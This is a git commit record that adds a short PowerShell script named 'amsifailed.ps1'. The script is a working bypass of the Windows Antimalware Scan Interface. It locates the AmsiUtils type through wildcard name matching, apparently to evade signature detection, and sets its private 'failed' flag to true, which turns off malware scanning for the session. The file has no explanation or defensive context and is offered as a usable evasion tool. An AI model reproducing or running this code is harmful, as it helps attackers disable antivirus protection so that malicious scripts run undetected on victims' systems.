0a414d1f12a3083e7aba33bc2da85c2228bf38ec
paulpierce34 <33561650+paulpierce34@users.noreply.github.com>
2023-12-19 11:39:21 -0500

    Add files via upload

---
+++ amsifailed.ps1
@@ -0,0 +1,17 @@
+﻿$a = [Ref].Assembly.GetTypes()
+
+Foreach ($Type in $a){
+if ($type.name -like "*iutils*"){
+$ams = $type
+$amstypes = $ams.GetFields('NonPublic,Static')
+}
+}
+
+
+## now that we have each of the different ams fields, lets wipe the context
+Foreach ($DifferentType in $amstypes){
+if ($DifferentType -like "*failed*"){
+$amsfailed = $DifferentType
+$Finalstage = $amsfailed.SetValue($null,$true)
+}
+}
